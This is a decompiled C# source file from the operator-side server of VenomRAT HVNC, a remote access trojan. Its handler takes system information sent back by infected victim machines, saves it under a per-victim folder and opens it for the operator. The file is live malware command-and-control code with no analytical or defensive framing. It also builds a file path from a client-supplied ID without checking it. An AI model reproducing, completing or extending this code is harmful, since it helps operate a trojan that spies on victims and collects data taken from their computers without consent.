using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Connection;

namespace VenomRAT_HVNC.Server.Handle_Packet
{
    // Token: 0x02000099 RID: 153
    public class HandleInformation
    {
        // Token: 0x0600058F RID: 1423 RVA: 0x00042DF8 File Offset: 0x00042DF8
        public void AddToInformationList(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                string text = Path.Combine(Application.StartupPath, "ClientsFolder\\" + unpack_msgpack.ForcePathObject("ID").AsString + "\\Information");
                string text2 = text + "\\Information.txt";
                if (!Directory.Exists(text))
                {
                    Directory.CreateDirectory(text);
                }
                File.WriteAllText(text2, unpack_msgpack.ForcePathObject("InforMation").AsString);
                Process.Start("explorer.exe", text2);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
    }
}